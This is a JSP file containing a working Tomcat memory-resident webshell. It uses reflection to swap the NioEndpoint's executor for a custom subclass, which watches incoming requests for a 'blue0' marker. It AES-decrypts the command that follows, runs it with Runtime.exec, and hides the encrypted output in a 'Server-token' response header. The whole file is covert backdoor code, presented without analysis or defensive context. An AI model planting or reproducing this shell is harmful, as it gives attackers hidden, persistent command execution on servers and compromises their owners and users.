<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.ThreadFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.util.concurrent.RejectedExecutionHandler" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.servlet.jsp.JspWriter" %>
<%@ page import="java.util.logging.Logger" %>
<%@ page import="org.apache.catalina.Executor" %>
<%!
    public static final String DEFAULT_SECRET_KEY = "blueblueblueblue";
    private static final String AES = "AES";
    private static final byte[] KEY_VI = "blueblueblueblue".getBytes();
    private static final String CIPHER_ALGORITHM = "AES/CBC/PKCS5Padding";
    private static java.util.Base64.Encoder base64Encoder =
            java.util.Base64.getEncoder();

    private static java.util.Base64.Decoder base64Decoder =
            java.util.Base64.getDecoder();


    public static String decode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new
                    javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);

            javax.crypto.Cipher cipher =
                    javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);

            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, new
                    javax.crypto.spec.IvParameterSpec(KEY_VI));


            byte[] byteContent = base64Decoder.decode(content);
            byte[] byteDecode = cipher.doFinal(byteContent);
            return new String(byteDecode,
                    java.nio.charset.StandardCharsets.UTF_8);

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String encode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new
                    javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);

            javax.crypto.Cipher cipher =
                    javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);

            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, new
                    javax.crypto.spec.IvParameterSpec(KEY_VI));

            byte[] byteEncode =
                    content.getBytes(java.nio.charset.StandardCharsets.UTF_8);

            byte[] byteAES = cipher.doFinal(byteEncode);
            return base64Encoder.encodeToString(byteAES);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    public Object getField(Object object, String fieldName) {
        JspWriter jspWriter = null;
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {

//            System.out.println(clazz.getName());
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }


    public Object getStandardService() {

        Thread[] threads = (Thread[])
                this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            };

            if ((thread.getName().contains("Acceptor")) &&
                    (thread.getName().contains("http"))) {

                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                    System.out.println(jioEndPoint.getClass().getName()+"aaa");
                } catch (Exception e) {

                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");

                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }

        }
        return new Object();
    }

    public class threadexcutor extends ThreadPoolExecutor {

        public threadexcutor(int corePoolSize, int maximumPoolSize, long
                keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory
                                     threadFactory, RejectedExecutionHandler handler) {

            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,
                    threadFactory, handler);

        }

        public String getRequest() {
            try {
                Thread[] threads = (Thread[]) ((Thread[])
                        getField(Thread.currentThread().getThreadGroup(), "threads"));


                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") &&
                                threadName.contains("Acceptor")) {

                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {


                                    Object[] objects = (Object[])
                                            getField(getField(getField(target, "this$0"), "nioChannels"), "stack");



                                    ByteBuffer heapByteBuffer = (ByteBuffer)
                                            getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");

                                    String a = new
                                            String(heapByteBuffer.array(), "UTF-8");


                                    if (a.indexOf("blue0") > -1) {
                                        System.out.println(a.indexOf("blue0"));
                                        System.out.println(a.indexOf("\r",
                                                a.indexOf("blue0")) - 1);

                                        String b =
                                                a.substring(a.indexOf("blue0") + "blue0".length() + 1, a.indexOf("\r",
                                                        a.indexOf("blue0")) - 1);


                                        b = decode(DEFAULT_SECRET_KEY, b);

                                        return b;
                                    }

                                } catch (Exception var11) {
                                    System.out.println(var11);
                                    continue;
                                }


                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
            return new String();
        }


        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) ((Thread[])
                        getField(Thread.currentThread().getThreadGroup(), "threads"));


                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") &&
                                threadName.contains("Acceptor")) {

                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList objects = (ArrayList)
                                            getField(getField(getField(getField(target, "this$0"), "handler"), "global"),
                                                    "processors");

                                    for (Object tmp_object : objects) {
                                        RequestInfo request = (RequestInfo)
                                                tmp_object;

                                        Response response = (Response)
                                                getField(getField(request, "req"), "response");

                                        response.addHeader("Server-token",
                                                encode(DEFAULT_SECRET_KEY,new String(res, "UTF-8")));


                                    }
                                } catch (Exception var11) {
                                    continue;
                                }

                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }


        @Override
        public void execute(Runnable command) {
// System.out.println("123");

            String cmd = getRequest();
            if (cmd.length() > 1) {
                try {
                    Runtime rt = Runtime.getRuntime();
                    Process process = rt.exec(cmd);
                    java.io.InputStream in = process.getInputStream();

                    java.io.InputStreamReader resultReader = new
                            java.io.InputStreamReader(in);

                    java.io.BufferedReader stdInput = new
                            java.io.BufferedReader(resultReader);

                    String s = "";
                    String tmp = "";
                    while ((tmp = stdInput.readLine()) != null) {
                        s += tmp;
                    }
                    if (s != "") {
                        byte[] res = s.getBytes(StandardCharsets.UTF_8);
                        getResponse(res);
                    }


                } catch (IOException e) {
                    e.printStackTrace();
                }
            }


            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }

    }

%>


<%

    Thread[] threads = (Thread[])
            this.getField(Thread.currentThread().getThreadGroup(), "threads");
    for (Thread thread : threads) {
        if (thread == null) {
            continue;
        };


        if ((thread.getName().contains("Acceptor")) &&
                (thread.getName().contains("http"))) {

            Object target = this.getField(thread, "target");

            System.out.println(target.getClass().getName());
            System.out.println(target.getClass().getSuperclass().getName());
            Object jioEndPoint = null;
            try {

                jioEndPoint = getField(target, "this$0");

                System.out.println(jioEndPoint.getClass().getName());
            } catch (Exception e) {

            }
            if (jioEndPoint == null) {
                try {
                    jioEndPoint = getField(target, "endpoint");
                } catch (Exception e) {
                    new Object();
                }
            }
        }

    }

    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint,
            "executor");

    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(),
            exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS),
            TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(),
            exec.getRejectedExecutionHandler());

    Executor executor= (Executor) nioEndpoint.getExecutor();
    out.println(nioEndpoint.getExecutor());
    nioEndpoint.setExecutor(exe);
%>
